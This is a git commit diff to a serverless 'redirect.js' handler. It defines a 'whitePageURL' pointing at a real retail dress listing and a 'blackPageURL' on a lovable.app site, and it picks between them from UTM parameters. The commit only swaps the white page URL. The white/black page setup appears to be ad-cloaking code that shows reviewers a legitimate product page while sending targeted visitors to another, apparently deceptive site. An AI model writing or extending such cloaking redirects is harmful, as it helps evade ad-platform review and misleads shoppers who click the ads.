89b26cc54dc254bb4dad594aa349f55a7f9fac7f
ahmadfarhanwork <ahmadfarhanwork@gmail.com>
2025-11-09 07:19:40 +0500

    Update redirect.js

--- api/redirect.js
+++ api/redirect.js
@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://jamiekay.com/products/organic-cotton-muslin-odette-playsuit-dina-antique?variant=62137728500083";
+    const whitePageURL = "https://www.myer.com.au/p/milkshake-gathered-neckline-dress-in-multicolour";
     const blackPageURL = "https://luvcshap.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
